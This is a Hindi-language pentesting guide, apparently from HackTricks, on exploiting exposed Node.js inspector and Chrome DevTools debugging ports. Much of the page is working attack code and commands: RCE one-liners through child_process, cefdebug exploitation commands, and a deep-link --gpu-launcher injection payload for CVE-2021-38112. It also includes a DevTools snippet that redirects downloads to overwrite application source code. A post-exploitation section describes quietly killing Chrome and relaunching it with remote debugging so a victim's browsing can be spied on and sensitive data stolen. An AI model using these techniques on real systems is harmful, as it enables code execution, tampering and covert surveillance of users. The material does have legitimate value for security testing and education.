# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` switch के साथ शुरू किए जाने पर, Node.js process एक debugging client के लिए listen करता है। **डिफ़ॉल्ट** रूप से, यह host और port **`127.0.0.1:9229`** पर listen करेगा। प्रत्येक process को एक **unique** **UUID** भी assign किया जाता है।

Inspector clients को connect करने के लिए host address, port और UUID पता होने चाहिए और उन्हें specify करना चाहिए। एक full URL कुछ इस तरह दिखाई देगा: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।

> [!WARNING]
> क्योंकि **debugger को Node.js execution environment का full access प्राप्त होता है**, इसलिए इस port से connect करने में सक्षम malicious actor, Node.js process की ओर से arbitrary code execute कर सकता है (**potential privilege escalation**)।

Inspector शुरू करने के कई तरीके हैं:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप किसी inspected process को शुरू करते हैं, तो कुछ इस तरह दिखाई देगा:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) पर आधारित processes को **debugger** खोलने के लिए `--remote-debugging-port=9222` param का उपयोग करना पड़ता है (SSRF protections बहुत समान रहती हैं)। हालांकि, **NodeJS** **debug** session प्रदान करने के बजाय, ये browser के साथ [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके communicate करते हैं। यह browser को control करने का एक interface है, लेकिन इसमें direct RCE नहीं होता।

जब आप debug किया हुआ browser शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ब्राउज़र, WebSockets और same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browser में खुली websites browser security model के अंतर्गत WebSocket और HTTP requests कर सकती हैं। **एक initial HTTP connection** **unique debugger session id प्राप्त करने** के लिए आवश्यक है। **same-origin-policy** websites को **यह HTTP connection बनाने** से **रोकती है**। [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** से अतिरिक्त security के लिए Node.js यह सत्यापित करता है कि connection के **'Host' headers** में या तो **IP address**, **`localhost`** या **`localhost6`** ही निर्दिष्ट हों।

> [!TIP]
> यह **security measure inspector का exploit करके code चलाने से रोकता है**, केवल **HTTP request भेजकर** (जो SSRF vuln का exploit करके किया जा सकता है)।

### Running processes में inspector शुरू करना

आप किसी running nodejs process को **signal SIGUSR1** भेजकर उसे default port में **inspector शुरू** करने के लिए कह सकते हैं। हालांकि, ध्यान दें कि आपके पास पर्याप्त privileges होना आवश्यक है, इसलिए इससे आपको **process के अंदर मौजूद information तक privileged access** मिल सकता है, लेकिन direct privilege escalation नहीं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> यह containers में उपयोगी है क्योंकि `--inspect` के साथ **process को बंद करके नया process शुरू करना** **विकल्प नहीं है**, क्योंकि **container** process के साथ **kill** हो जाएगा।

### inspector/debugger से connect करें

**Chromium-based browser** से connect करने के लिए Chrome या Edge में क्रमशः `chrome://inspect` या `edge://inspect` URLs access किए जा सकते हैं। Configure बटन पर क्लिक करके यह सुनिश्चित करना चाहिए कि **target host और port** सही ढंग से listed हैं। चित्र में Remote Code Execution (RCE) का उदाहरण दिखाया गया है:

![Debugger access करने के लिए एक URL दिखाई देगा। उदाहरण: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger से connect करें: Chromium-based browser से connect करने के लिए,...](<../../images/image (674).png>)

**command line** का उपयोग करके आप debugger/inspector से connect कर सकते हैं:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
यह tool स्थानीय रूप से चल रहे **inspectors** को **find** करने और उनमें **code inject** करने की अनुमति देता है: [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)।
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> ध्यान दें कि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से browser से connected होने पर **NodeJS RCE exploits काम नहीं करेंगे** (इसके साथ करने योग्य दिलचस्प चीज़ें खोजने के लिए आपको API की जाँच करनी होगी)।

## NodeJS Debugger/Inspector में RCE

> [!TIP]
> यदि आप यह जानने के लिए यहाँ आए हैं कि [**Electron में XSS से RCE कैसे प्राप्त करें, तो यह पेज देखें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

जब आप किसी Node **inspector** से **connect** कर सकते हैं, तब **RCE** प्राप्त करने के कुछ सामान्य तरीकों में निम्न जैसा कुछ उपयोग करना शामिल है (ऐसा लगता है कि यह **Chrome DevTools protocol** से किए गए connection में काम नहीं करेगा):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
इस section में मैं केवल उन दिलचस्प चीज़ों की सूची दूँगा, जिनका उपयोग लोगों ने इस protocol का exploit करने के लिए किया है।

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino security ने पाया कि CEF पर आधारित एक application ने system में एक custom UR**I (workspaces://index.html) register किया था, जो full URI प्राप्त करता था और फिर उस URI से आंशिक रूप से configuration तैयार करके **CEF आधारित applicatio**n को launch करता था।

यह पता चला कि URI parameters को URL decode किया जाता था और CEF आधारित application को launch करने के लिए उपयोग किया जाता था, जिससे user **`--gpu-launcher`** flag को **command line** में **inject** कर सकता था और arbitrary चीज़ें execute कर सकता था।

इसलिए, एक payload इस प्रकार हो सकता है:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe को execute करेगा।

### Files को Overwrite करना

वह folder बदलें जहाँ **downloaded files save होने वाली हैं** और application के frequently used **source code** को अपने **malicious code** से **overwrite** करने के लिए एक file download करें।
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

इस post के अनुसार: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) theriver से RCE प्राप्त करना और internal pages को exfiltrate करना संभव है।

### Post-Exploitation

एक वास्तविक environment में और **Chrome/Chromium based browser का उपयोग करने वाले user PC को compromise करने के बाद**, आप **debugging activated के साथ Chrome process launch कर सकते हैं और debugging port को port-forward कर सकते हैं**, ताकि आप उस तक access कर सकें। इस तरह आप **victim द्वारा Chrome पर की जाने वाली हर गतिविधि को inspect कर सकेंगे और sensitive information चुरा सकेंगे**।

Stealth तरीके से **हर Chrome process को terminate करें** और फिर कुछ इस तरह call करें
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## संदर्भ

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
